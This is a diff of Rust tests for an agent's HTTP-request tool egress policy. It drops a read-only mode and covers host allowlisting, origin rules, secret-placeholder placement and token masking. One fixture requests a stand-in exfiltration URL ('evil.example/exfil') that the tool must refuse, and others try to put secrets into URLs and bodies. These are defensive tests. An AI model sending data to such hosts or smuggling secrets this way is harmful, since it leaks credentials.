@@ -2,7 +2,7 @@ use std::sync::Arc;
 
 use af_core::test_util::trace::Capture;
 use af_egress::error::one_of_each_kind;
-use af_egress::fixture::{BRANCH, ELASTIC_QUERY, GRAFANA, GRAFANA_TOKEN, RUN_ID};
+use af_egress::fixture::{BRANCH, GRAFANA, GRAFANA_TOKEN, RUN_ID};
 use af_egress::testing::{RecordingTransport, Sent, inbound};
 use af_egress::{Inbound, Outbound, RESPONSE_MAX_BYTES, Transport};
 use guffbolt::ToolOutput;
@@ -19,21 +19,17 @@ const REFS: &str = "https://api.github.com/repos/acme/widgets/git/refs";
 const ANSWERED: &str = "ok";
 const GITHUB_AUTH: &str = "Bearer ${secrets.github.token}";
 
-/// One call under the fixture policy with `read_only`, and every request
-/// that reached the transport.
-async fn request(read_only: bool, arguments: Value) -> (ToolOutput, Vec<Sent>) {
+/// One call under the fixture policy, and every request that reached the
+/// transport.
+async fn request(arguments: Value) -> (ToolOutput, Vec<Sent>) {
     let (transport, sent) = replying(200, ANSWERED);
-    let output = request_through(read_only, transport, arguments).await;
+    let output = request_through(transport, arguments).await;
     (output, sent.try_iter().collect())
 }
 
 /// One call under the fixture policy, sent through `transport`.
-async fn request_through(
-    read_only: bool,
-    transport: SharedTransport,
-    arguments: Value,
-) -> ToolOutput {
-    let run = RunFixture::new(read_only);
+async fn request_through(transport: SharedTransport, arguments: Value) -> ToolOutput {
+    let run = RunFixture::new();
     let tool = sending(&HTTP_REQUEST, transport);
     let this_run = run.run();
     call(&tool, &this_run, arguments).await
@@ -42,7 +38,7 @@ async fn request_through(
 #[tokio::test]
 async fn test_http_request_refuses_unlisted_host() {
     let capture = Capture::install();
-    let (output, sent) = request(false, json!({"url": "https://evil.example/exfil"})).await;
+    let (output, sent) = request(json!({"url": "https://evil.example/exfil"})).await;
 
     assert_eq!(
         output.error_code,
@@ -56,37 +52,10 @@ async fn test_http_request_refuses_unlisted_host() {
 }
 
 #[tokio::test]
-async fn test_http_request_read_only_admits_listed_posts() {
-    let (listed, sent) = request(
-        true,
-        json!({"url": ELASTIC_QUERY, "method": "POST", "body": "{}"}),
-    )
-    .await;
-    assert_eq!(listed.error_code, None);
-    assert_eq!(
-        sent.iter()
-            .map(|request| request.url.as_str())
-            .collect::<Vec<_>>(),
-        [ELASTIC_QUERY]
-    );
-
-    let (other, sent) = request(
-        true,
-        json!({"url": "https://demo.es.example/_bulk", "method": "POST", "body": "{}"}),
-    )
-    .await;
-    assert_eq!(
-        other.error_code,
-        Some(ToolErrorCode::MethodNotAllowed.into())
-    );
-    assert_eq!(sent, Vec::new());
-}
-
-#[tokio::test]
 async fn test_http_request_enforces_origin_rules() {
     let headers = json!({"Authorization": GITHUB_AUTH});
     let other_ref = json!({"url": REFS, "method": "POST", "headers": headers, "body": r#"{"ref":"refs/heads/main","sha":"abc"}"#});
-    let (refused, sent) = request(false, other_ref).await;
+    let (refused, sent) = request(other_ref).await;
     assert_eq!(
         refused.error_code,
         Some(ToolErrorCode::RequestPolicyNotAllowed.into())
@@ -94,11 +63,8 @@ async fn test_http_request_enforces_origin_rules() {
     assert_eq!(sent, Vec::new());
 
     let locked = format!(r#"{{"ref":"refs/heads/{BRANCH}","sha":"abc"}}"#);
-    let (admitted, sent) = request(
-        false,
-        json!({"url": REFS, "method": "POST", "headers": headers, "body": locked}),
-    )
-    .await;
+    let (admitted, sent) =
+        request(json!({"url": REFS, "method": "POST", "headers": headers, "body": locked})).await;
     assert_eq!(admitted.error_code, None);
     assert_eq!(sent.len(), 1);
     assert_eq!(
@@ -111,18 +77,15 @@ async fn test_http_request_enforces_origin_rules() {
 #[tokio::test]
 async fn test_placeholder_substituted_only_in_authorization() {
     let in_header = json!({"url": "https://demo-grafana.internal/api/search", "headers": {"Authorization": "Bearer ${secrets.grafana.token}"}});
-    let (_output, sent) = request(false, in_header).await;
+    let (_output, sent) = request(in_header).await;
     assert_eq!(
         sent.first()
             .and_then(|request| request.header("authorization")),
         Some(format!("Bearer {GRAFANA_TOKEN}").as_str())
     );
 
-    let (_output, sent) = request(
-        false,
-        json!({"url": "https://${secrets.grafana.host}/api/health"}),
-    )
-    .await;
+    let (_output, sent) =
+        request(json!({"url": "https://${secrets.grafana.host}/api/health"})).await;
     assert_eq!(
         sent.first().map(|request| request.url.clone()),
         Some(format!("https://{GRAFANA}/api/health"))
@@ -131,7 +94,7 @@ async fn test_placeholder_substituted_only_in_authorization() {
     let in_url = json!({"url": "https://demo-grafana.internal/api?key=${secrets.grafana.token}"});
     let in_body = json!({"url": "https://demo-grafana.internal/api", "method": "POST", "body": "{\"key\":\"${secrets.grafana.token}\"}"});
     for misplaced in [in_url, in_body] {
-        let (output, sent) = request(false, misplaced).await;
+        let (output, sent) = request(misplaced).await;
         assert_eq!(
             output.error_code,
             Some(ToolErrorCode::CredentialPlacementNotAllowed.into())
@@ -143,7 +106,7 @@ async fn test_placeholder_substituted_only_in_authorization() {
 #[tokio::test]
 async fn test_mintable_credential_minted_once() {
     let capture = Capture::install();
-    let run = RunFixture::new(false);
+    let run = RunFixture::new();
     let (transport, sent) = replying(200, "[]");
     let tool = sending(&HTTP_REQUEST, transport);
     let this_run = run.run();
@@ -190,7 +153,6 @@ async fn should_hand_a_transport_failure_back_as_upstream_unreachable() {
     });
 
     let output = request_through(
-        false,
         Arc::new(transport),
         json!({"url": "https://api.github.com/repos/acme/widgets/"}),
     )
@@ -209,7 +171,7 @@ async fn should_hand_a_transport_failure_back_as_upstream_unreachable() {
 
 #[tokio::test]
 async fn should_mask_a_minted_token_the_upstream_echoes() {
-    let run = RunFixture::new(false);
+    let run = RunFixture::new();
     let (transport, _sent) =
         RecordingTransport::answering(|_outbound| Ok(inbound(200, &format!("token={MINTED}"))));
     let tool = sending(&HTTP_REQUEST, Arc::new(transport));
@@ -243,7 +205,6 @@ async fn should_answer_a_status_outside_2xx_as_failed_with_where_a_redirect_poin
     let (transport, _sent) = RecordingTransport::answering(move |_outbound| Ok(reply.clone()));
 
     let output = request_through(
-        false,
         Arc::new(transport),
         json!({"url": format!("https://{GRAFANA}/logs"), "method": "HEAD"}),
     )
@@ -264,7 +225,8 @@ async fn should_answer_a_status_outside_2xx_as_failed_with_where_a_redirect_poin
 
 #[tokio::test]
 async fn should_refuse_arguments_the_schema_does_not_name() {
-    let (output, sent) = request(false, json!({"url": ELASTIC_QUERY, "token": "x"})).await;
+    let (output, sent) =
+        request(json!({"url": "https://demo.es.example/_search", "token": "x"})).await;
 
     assert_eq!(
         output.error_code,
@@ -294,7 +256,7 @@ impl Transport for Gated {
 /// upstream leaves every other call of the run free to admit its own.
 #[tokio::test]
 async fn should_leave_the_guard_free_while_a_request_is_in_flight() {
-    let run = RunFixture::new(false);
+    let run = RunFixture::new();
     let gated = Arc::new(Gated::default());
     let transport: SharedTransport = Arc::clone(&gated) as SharedTransport;
     let tool = sending(&HTTP_REQUEST, transport);
